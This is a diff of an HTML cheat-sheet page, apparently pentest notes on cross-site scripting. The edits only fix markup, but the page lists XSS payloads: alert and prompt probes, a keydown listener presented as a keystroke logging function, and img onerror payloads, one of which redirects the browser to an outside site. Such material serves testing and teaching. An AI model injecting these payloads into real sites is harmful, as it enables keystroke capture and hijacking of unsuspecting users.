@@ -75,16 +75,16 @@ information, stole information, etc. </p>
 1. open dev tools in your browser
 2. type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button>
 
 <b><u>CREATE A LOG FUNCTION TO STORE/RETRIEVE DATA USING XSS</u></b>
 
 <b><u>step1></u></b>
-$ <mark id="TDT04">function logKey(event){console.log(event.key)}</mark>
+$ <mark id="TDT04">function logKey(event){console.log(event.key)}</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>
 
 <b><u>step2></u></b>
-$ <mark id="TDT05">document.addEventListener('keydown', logKey)</mark>
+$ <mark id="TDT05">document.addEventListener('keydown', logKey)</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C1.</button>
 	
 </details>
@@ -106,8 +106,8 @@ going it means it is reflected or stored, if not, it means it is <b>DOM-BASED.</
 <details>
 <summary>NORMAL TESTS</summary>
 
-1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;
-2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;
+1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;</mark>
+2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button>
 	
